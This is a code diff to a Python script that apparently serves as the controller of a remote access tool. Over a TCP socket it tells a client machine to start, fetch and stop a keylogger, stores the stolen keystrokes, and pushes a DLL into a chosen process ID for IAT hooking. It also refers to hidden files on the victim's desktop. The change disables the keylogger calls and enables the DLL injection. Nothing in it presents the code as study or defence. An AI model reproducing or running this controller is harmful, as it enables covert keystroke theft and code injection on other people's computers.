@@ -1,11 +1,11 @@
 #!/usr/bin/env python
 import socket
 from threading import Thread
-
+import time
 from SocketManager import SocketManager
 
-IAT_HOOKING_PROCESS_ID = 4604
-IAT_HOOKING_DLL = r"IAT Hooking\IATHookingDLL.dll"
+IAT_HOOKING_PROCESS_ID = 3140
+IAT_HOOKING_DLL = r"IAT Hooking\\IATHookingDLL.dll"
 KEY_LOGGER_FILE = r"keyLogger.txt"
 HIDDEN_FILE_PATH = r"C:\Users\admin\Desktop\hidden files.txt"
 DIR_TO_MOVE = r"C:\Users\admin\Desktop\New folder"
@@ -31,7 +31,6 @@ def bin_file_to_buffer(file_path):
 def full_bin_file_to_buffer(file_path):
     with open(file_path, 'rb') as fp:
         data = fp.read()
-
     return data
 
 # def key_logger_thread(conn, log_file_path):
@@ -53,7 +52,7 @@ def full_bin_file_to_buffer(file_path):
 
 
 if __name__ == '__main__':
-    TCP_IP = '10.0.0.1'
+    TCP_IP = '127.0.0.1'
     TCP_PORT = 5007
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -134,28 +133,33 @@ if __name__ == '__main__':
         # print(data)
 
         # start key logger
-        SocketManager.send_data(conn, "START_KEY_LOGGER")
+        #SocketManager.send_data(conn, "START_KEY_LOGGER")
+        #time.sleep(20)
 
         # get key_logger_data
-        SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA")
-        key_logger_data = SocketManager.receive(data)
-        try:
-            with open(KEY_LOGGER_FILE, 'a') as fp:
-                fp.write(key_logger_data)
+        #SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA")
+        #key_logger_data = SocketManager.receive(data)
+        #try:
+        #    with open(KEY_LOGGER_FILE, 'a') as fp:
+        #        fp.write(key_logger_data)
 
-        except Exception as ex:
-            print("Error openning file")
-            print(ex)
+        #except Exception as ex:
+        #    print("Error openning file")
+        #    print(ex)
+        #time.sleep(20)
 
         # stop key logger
-        SocketManager.send_data(conn, "STOP_KEY_LOGGER")
-        if not is_running_key_logger:
-            print("Currently, no key logger is running...")
+        #SocketManager.send_data(conn, "STOP_KEY_LOGGER")
+        #if not is_running_key_logger:
+        #    print("Currently, no key logger is running...")
+        #time.sleep(20)
+
+
 
         # IAT Hooking
-        # SocketManager.send_data(conn, "IAT_HOOKING")
-        # SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
-        # dll_data = full_bin_file_to_buffer(IAT_HOOKING_DLL)
-        # SocketManager.send_data(conn, dll_data)
+        SocketManager.send_data(conn, "IAT_HOOKING")
+        SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
+        dll_data = full_bin_file_to_buffer(IAT_HOOKING_DLL)
+        SocketManager.send_data(conn, dll_data)
 
 conn.close()
